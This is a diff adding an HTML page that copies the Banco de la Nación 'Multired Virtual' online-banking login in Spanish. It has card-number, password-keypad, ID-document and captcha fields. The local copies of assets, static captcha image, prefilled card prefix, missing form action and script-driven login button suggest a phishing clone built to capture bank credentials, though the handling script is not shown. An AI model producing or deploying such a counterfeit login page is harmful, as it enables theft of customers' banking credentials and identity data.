@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="Content-Language" content="es">
+  <title>Banco de la Nación - Multired Virtual</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+  <div id="contenedor">
+
+    <!-- ===== Cabecera ===== -->
+    <div id="cabecera">
+      <div id="logo-multired">
+        <img src="assets/img/logo-multired.jpeg" alt="Logotipo Multired">
+      </div>
+      <div id="logo-bn">
+        <img src="assets/img/logo-bn.jpeg" alt="Logotipo del Banco de la Nación">
+      </div>
+    </div>
+
+    <!-- Separador decorativo -->
+    <img src="assets/img/separador.jpeg" alt="">
+
+    <!-- ===== Cuerpo ===== -->
+    <div id="cuerpo">
+
+      <h1>
+        <img src="assets/img/icono-zona-segura.png" alt="">
+        Usted se encuentra en una <span>zona segura</span>
+      </h1>
+
+      <!-- ===== Formulario de login ===== -->
+      <div id="login">
+
+        <!-- Borde superior decorativo -->
+        <div id="border-superior">
+          <img src="assets/img/border-superior.png" alt="Border Login Superior">
+        </div>
+
+        <div id="login-contenido">
+
+          <div id="border-inferior"></div>
+
+          <form method="post" id="form" name="form">
+
+            <!-- Fila 1: Tipo de documento / tarjeta -->
+            <div class="fila limpiar">
+              <label for="cboTipoTarjeta">Seleccione:</label>
+
+              <select class="tipo-documento select" id="cboTipoTarjeta" name="cboTipoTarjeta" style="display:none;">
+                <option value="tarjeta">Multired Global Débito</option>
+                <option value="dni">DNI (Cuenta Corriente)</option>
+              </select>
+
+              <!-- Select personalizado (jQuery UI style) -->
+              <a class="ui-selectmenu ui-widget ui-state-default ui-corner-all tipo-documento select ui-selectmenu-dropdown"
+                 id="cboTipoTarjeta-button"
+                 role="button"
+                 href="#"
+                 aria-haspopup="true"
+                 aria-owns="cboTipoTarjeta-menu"
+                 style="width: 248.4px;">
+                <span class="ui-selectmenu-status">Multired Global Débito</span>
+                <span class="ui-selectmenu-icon ui-icon ui-icon-triangle-1-s"></span>
+              </a>
+            </div>
+
+            <!-- Fila 2: Número de tarjeta / DNI -->
+            <div class="fila limpiar">
+              <label id="trNumeroTarjeta" for="txtNumeroTarjeta" class="tarjeta_dni">Número de tarjeta:</label>
+              <input type="text" name="txtNumeroTarjeta" id="txtNumeroTarjeta"
+                     class="grande tarjeta_dni" maxlength="16" value="4214">
+
+              <label id="trDNI" for="txtDNI" class="tarjeta_dni" style="display:none;">DNI:</label>
+              <input type="text" name="txtDNI" id="txtDNI"
+                     class="grande tarjeta_dni" maxlength="8" style="display:none;" value="">
+            </div>
+
+            <!-- Fila 3: Tipo y N° de documento -->
+            <div class="fila limpiar" id="tipoNumDoc">
+              <label id="trTipoNumDoc" for="txtNumDoc">Tipo y N° Documento:</label>
+
+              <select id="cboTipoDoc" name="cboTipoDoc" class="select select-medio" style="display:none;">
+                <option value=""> Seleccione...</option>
+                <option value="dni"> DNI</option>
+                <option value="pasaporte"> Pasaporte</option>
+                <option value="extranjeria"> C. Extranjeria</option>
+                <option value="ruc"> RUC</option>
+              </select>
+
+              <!-- Select personalizado mediano -->
+              <a class="ui-selectmenu ui-widget ui-state-default ui-corner-all select select-medio ui-selectmenu-dropdown"
+                 id="cboTipoDoc-button"
+                 role="button"
+                 href="#"
+                 aria-haspopup="true"
+                 aria-owns="cboTipoDoc-menu"
+                 style="width: 103.4px;">
+                <span class="ui-selectmenu-status"> Seleccione...</span>
+                <span class="ui-selectmenu-icon ui-icon ui-icon-triangle-1-s"></span>
+              </a>
+
+              <input type="text" class="input-chico3" name="txtNumDoc" id="txtNumDoc"
+                     maxlength="12" size="8" style="width:109px !important; border-radius:8px;" value="">
+            </div>
+
+            <!-- Fila 4: Clave (teclado virtual + campo) -->
+            <div class="fila limpiar">
+              <label for="txtPassword" style="width:140px;">
+                Ingresa tu clave usando el teclado virtual:
+              </label>
+
+              <!-- Teclado virtual numérico -->
+              <div id="botones-clave">
+                <div class="boton-clave">9</div>
+                <div class="boton-clave">0</div>
+                <div class="boton-clave">1</div>
+                <div class="boton-clave">7</div>
+                <div class="boton-clave">4</div>
+                <div class="boton-clave">8</div>
+                <div class="boton-clave">3</div>
+                <div class="boton-clave">2</div>
+                <div class="boton-clave">6</div>
+                <div class="boton-clave">5</div>
+                <div class="boton-clave limpiar" id="limpiar">LIMPIAR</div>
+              </div>
+
+              <!-- Campo de clave e info -->
+              <div id="campo-clave">
+                <p style="width:175px !important;">
+                  <img src="assets/img/icono-genera-clave.png" border="0" width="20" height="20"
+                       style="float:left; margin:-3px !important;" alt="">
+                  <a href="https://bancaporinternet.bn.com.pe/BNWeb/Afiliacion"
+                     style="color:rgb(186,17,19); text-decoration:underline; font:12px arial;">
+                    Genera tu Clave de Internet
+                  </a>
+                </p>
+                <p style="width:124px;">
+                  Ingresa tu <b>Clave de Internet (06 dígitos)</b>
+                </p>
+                <input type="password" name="txtPassword" id="txtPassword"
+                       maxlength="6" readonly style="margin:0 10px;">
+                <div class="olvido-clave">
+                  <div class="olvide-clave">
+                    <a href="https://bancaporinternet.bn.com.pe/BNWeb/Olvido"
+                       style="color:rgb(186,17,19); text-decoration:underline;">
+                      Olvidé mi clave
+                    </a>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Fila 5: Captcha -->
+            <div class="fila limpiar">
+              <label for="txtCaptcha">Ingresa el texto de la imagen:</label>
+              <div class="capcha">
+                <div id="srcCaptcha">
+                  <img alt="captcha" id="captcha" name="captcha"
+                       src="assets/img/captcha.jpeg" height="25" width="114">
+                </div>
+                <div class="boton_captcha" id="boton_captcha">Cambiar texto</div>
+              </div>
+              <input class="capcha" type="text" name="txtCaptcha" id="txtCaptcha"
+                     maxlength="5" style="margin:0 10px;" value="">
+            </div>
+
+            <!-- Fila 6: Botón ingresar -->
+            <div class="fila limpiar">
+              <input name="btnLogin" id="btnLogin" type="button" value="INGRESAR">
+            </div>
+
+            <!-- Mensaje de error (se muestra al validar) -->
+            <div class="cysErrorMsg" id="mensajeError" style="display:none; margin-left:-60px;">
+              ACTUALMENTE TIENE ABIERTO OTRA SESION, ASEGURESE DE CERRARLO POR SEGURIDAD
+            </div>
+
+            <!-- Fila 7: Recomendaciones de seguridad -->
+            <div class="fila limpiar" align="center" style="padding-right:50px;">
+              <p style="width:175px !important;">
+                <a href="https://www.bn.com.pe/clientes/banca-internet/formatos/recomendaciones-seguridad.pdf"
+                   target="_blank"
+                   style="color:rgb(51,102,187); text-decoration:underline; font:12px arial;">
+                  Recomendaciones de Seguridad
+                </a>
+              </p>
+            </div>
+
+            <!-- Fila 8: Guías de usuario -->
+            <div class="fila limpiar" align="center" style="padding-right:50px; margin:0;">
+              <img src="assets/img/sf-img-33.png" width="10" height="10" alt="">
+              <a href="https://www.bn.com.pe/multired-virtual/archivos/manual-multired-virtual-cuentas-ahorro.pdf"
+                 target="_blank" rel="noopener noreferrer"
+                 style="color:rgb(0,0,0); font:12px arial;">
+                Guía Cuenta de Ahorro
+              </a>
+              <img src="assets/img/sf-img-33.png" width="10" height="10" alt="">
+              <a href="https://www.bn.com.pe/multired-virtual/archivos/manual-multired-virtual-cuentas-corrientes.pdf"
+                 target="_blank" rel="noopener noreferrer"
+                 style="color:rgb(0,0,0); font:12px arial;">
+                Guía Cuentas Corrientes
+              </a>
+            </div>
+
+          </form>
+        </div><!-- /#login-contenido -->
+
+        <!-- Borde inferior decorativo -->
+        <div id="border-inferior">
+          <img src="assets/img/border-inferior.png" alt="Border Login Inferior">
+        </div>
+
+      </div><!-- /#login -->
+
+    </div><!-- /#cuerpo -->
+
+    <!-- ===== Pie de página ===== -->
+    <div id="pie-pagina">
+      <div id="titulo-pie-pagina">Banco de la Nación | Ministerio de Economía y Finanzas</div>
+      <div id="oficinas">
+        <p>Oficina Principal: Av. Javier Prado Este 2499. San Borja. Central Telefónica: 519 2000.</p>
+        <p>Atención en Oficinas Administrativas: Lunes a Viernes de 08:30 a 17:30. Refrigerio de: 13:00-14:00.</p>
+        <p>Atención en Oficina de Trámite Documentario: Lunes a Viernes de 8:30 a 16:30 (horario corrido).</p>
+      </div>
+    </div>
+
+  </div><!-- /#contenedor -->
+
+  <!-- Menú desplegable tipo documento -->
+  <ul class="ui-selectmenu-menu ui-widget ui-widget-content ui-corner-bottom tipo-documento select ui-selectmenu-menu-dropdown"
+      aria-hidden="true" role="listbox"
+      aria-labelledby="cboTipoTarjeta-button"
+      id="cboTipoTarjeta-menu"
+      style="width:248.4px; left:685.8px; top:233px;">
+    <li role="presentation" class="ui-selectmenu-item-selected">
+      <a href="#" tabindex="-1" role="option" aria-selected="true">Multired Global Débito</a>
+    </li>
+    <li role="presentation" class="ui-corner-bottom">
+      <a href="#" tabindex="-1" role="option" aria-selected="false">DNI (Cuenta Corriente)</a>
+    </li>
+  </ul>
+
+  <!-- Menú desplegable tipo de documento (cuenta corriente) -->
+  <ul class="ui-selectmenu-menu ui-widget ui-widget-content ui-corner-bottom select select-medio ui-selectmenu-menu-dropdown"
+      aria-hidden="true" role="listbox"
+      aria-labelledby="cboTipoDoc-button"
+      id="cboTipoDoc-menu"
+      style="width:103.4px; left:685.8px; top:306px;">
+    <li role="presentation" class="ui-selectmenu-item-selected">
+      <a href="#" tabindex="-1" role="option" aria-selected="true"> Seleccione...</a>
+    </li>
+    <li role="presentation">
+      <a href="#" tabindex="-1" role="option" aria-selected="false"> DNI</a>
+    </li>
+    <li role="presentation">
+      <a href="#" tabindex="-1" role="option" aria-selected="false"> Pasaporte</a>
+    </li>
+    <li role="presentation">
+      <a href="#" tabindex="-1" role="option" aria-selected="false"> C. Extranjeria</a>
+    </li>
+    <li role="presentation" class="ui-corner-bottom">
+      <a href="#" tabindex="-1" role="option" aria-selected="false"> RUC</a>
+    </li>
+  </ul>
+
+  <script src="main.js"></script>
+</body>
+</html>
